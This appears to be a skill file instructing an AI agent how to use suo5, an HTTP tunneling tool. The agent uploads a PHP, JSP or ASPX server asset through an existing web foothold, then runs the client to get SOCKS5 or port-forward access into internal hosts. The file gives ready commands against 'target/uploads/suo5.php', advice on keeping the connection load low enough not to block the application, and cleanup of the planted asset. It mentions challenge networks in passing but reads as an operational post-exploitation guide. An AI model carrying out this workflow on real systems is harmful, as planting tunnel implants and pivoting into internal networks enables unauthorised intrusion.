---
name: tool-suo5-forward-proxy
description: Use when you need a practical operating guide for suo5 as a high-performance forward SOCKS or port-forward tunnel through uploaded PHP, JSP, or ASPX assets.
---

# Tool Guide: suo5

## Overview

Use this skill when you want a positive-direction tunnel through an uploaded web asset and you need better performance or compatibility than a simple reverse shell.

## When to Use

- A web foothold already exists and can host `suo5.php`, `suo5.jsp`, or `suo5.aspx`.
- You want SOCKS5 or direct forward mode without relying on reverse callback as the primary path.
- The goal is to browse or exploit internal services from the operator side through HTTP tunneling.

## Remote Paths

- Client binary: `/root/niuniu-agent/tools/bin/suo5`
- Source / usage repo: `/root/niuniu-agent/tools/suo5`
- PHP server asset: `/root/niuniu-agent/tools/suo5/assets/php/suo5.php`
- Java server asset: `/root/niuniu-agent/tools/suo5/assets/java/suo5.jsp`
- .NET server asset: `/root/niuniu-agent/tools/suo5/assets/dotnet/suo5.aspx`

## Recommended Workflow

1. Choose the matching server asset for the current stack and upload it through the existing foothold.
2. Confirm the asset is reachable over HTTP before starting the client.
3. Start `suo5` in SOCKS mode first unless you only need a single port.
4. Use `--forward` when a single internal host:port is enough.
5. Keep request rate and connection count conservative on PHP targets.

## Practical Commands

Basic SOCKS tunnel:

```bash
/root/niuniu-agent/tools/bin/suo5 \
  -t http://target/uploads/suo5.php \
  -l 127.0.0.1:1111
```

Single forward target:

```bash
/root/niuniu-agent/tools/bin/suo5 \
  -t http://target/uploads/suo5.php \
  -f 172.20.0.5:8080 \
  -l 127.0.0.1:18080
```

With extra headers or cookies:

```bash
/root/niuniu-agent/tools/bin/suo5 \
  -t http://target/uploads/suo5.php \
  -H 'Cookie: PHPSESSID=...' \
  -H 'X-Requested-With: XMLHttpRequest'
```

## Operational Notes

- Prefer `auto` mode first; let suo5 choose the best transport mode.
- On PHP-FPM targets, pay attention to worker exhaustion. If `pm.max_children` is small, too many concurrent connections can block the app.
- `--forward` is often the cleanest option for single-service exploitation in internal challenge networks.
- This tool is especially good when you already have webshell upload and want to avoid reverse tunnels.

## Resource Guardrails

- Start with one tunnel and one concrete target service.
- On PHP targets, avoid opening many simultaneous long-lived connections.
- Clean up uploaded `suo5.*` assets when the objective changes.
